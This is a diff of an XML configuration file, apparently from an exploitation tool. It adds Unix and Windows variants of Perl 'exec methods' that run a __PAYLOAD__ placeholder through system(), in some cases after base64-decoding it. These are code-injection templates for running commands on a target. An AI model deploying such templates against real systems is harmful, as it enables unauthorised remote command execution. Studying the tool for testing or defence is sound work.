@@ -16,8 +16,10 @@
 	</log_files>
 	
 	<exec_methods>
-		<exec dobase64="1" name="system[b64]"    source='use MIME::Base64; system(base64_decode("__PAYLOAD__")) . " 2&gt;&amp;1";' />
-		<exec dobase64="0" name="system"   		 source='system("__PAYLOAD__" . " 2&gt;&amp;1";' />
+		<exec unix="1" win="0" dobase64="1" name="system[b64]"    	source='use MIME::Base64; system(base64_decode("__PAYLOAD__")) . " 2&gt;&amp;1";' />
+		<exec unix="1" win="0" dobase64="0" name="system"   		source='system("__PAYLOAD__" . " 2&gt;&amp;1";' />
+		<exec unix="0" win="1" dobase64="1" name="system[b64][win]" source='use MIME::Base64; system(base64_decode("__PAYLOAD__"));' />
+		<exec unix="0" win="1" dobase64="0" name="system[win]"   	source='system("__PAYLOAD__");' />
 	</exec_methods>
 	
 	<payloads>
